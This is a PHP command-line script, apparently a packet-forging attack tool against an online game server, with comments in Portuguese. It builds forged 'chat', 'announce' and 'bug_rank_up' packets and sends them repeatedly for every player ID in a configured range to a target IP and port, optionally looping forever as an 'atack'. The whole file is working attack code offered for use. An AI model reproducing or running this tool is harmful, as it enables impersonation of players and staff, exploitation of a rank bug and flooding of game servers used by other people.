<?php 
// Silencioso
require ("class/_getBytes.php");
require("../_public/utils.php");
$config = parse_ini_file("config.ini", true);
$uleep = (int)$config['sleepTime'] < 0 ? 0 : (int)$config['sleepTime']*1000;

if (!isset($argv[1])) exit();

switch ($argv[1]) {
	case 'chat':
		if (!isset($argv[2],$argv[3])) {
			die("[] Sintaxy: forgetPacket.php chat \"GM Test\" \"Mensagem\" ".PHP_EOL);
		}
		$bytes = new GetHex("chat \"".$argv[2]."\" \"".$argv[3], $config['debug']."\"");
		break;
	case 'announce':
		if (!isset($argv[2],$argv[3])) {
			die("[] Sintaxy: forgetPacket.php announce {Type 2 ou 1} \"Mensagem\" ".PHP_EOL);
		}
		$bytes = new GetHex("announce \"".$argv[2]."\" \"".$argv[3], $config['debug']."\"");
		break;
	case 'bug_rank_up':
		$bytes = new GetHex("bug_rank_up", $config['debug']);
		break;
	default:
		die("Not found");
		break;
}

if (!isset($bytes->bytes)) {
	die("Bytes null");
}
require("../_public/class/int_byte.php");

$write = new SendPacket();
$write->addr = $config['ip'];
$write->port = $config['port'];

while(true){

	for ($pId=$config['PlayerId_Start']; $pId <= $config['PlayerId_End']; $pId++) {
	 	$write->int16(13);
		$write->int64($pId); #pId
		$write->int8(1); #type13 0 | outher

		$write->uInt16(count($bytes->bytes)); # packetSize
		{
			
			foreach ($bytes->bytes as $value) {
				$write->addByte($value);
			}
		}

		for ($i=1; $i <= $config['packetsPerID']; $i++) { 
			$write->Send();
		}
		

		if($config['debug'])
			echo "[".number_format(percent($pId,$config['PlayerId_End']),1)."%]\tPlayerId $pId - ".$config['PlayerId_Start']."/".$pId."\n";
		else
			echo ".";

		$write->clear();
		usleep($uleep);
		
	}
	if ((bool)$config['loop']) {
		echo "[Loop]\t!!!Restarting atack!!!". PHP_EOL;
	}else{
		break;
	}
	sleep(1);
}
?>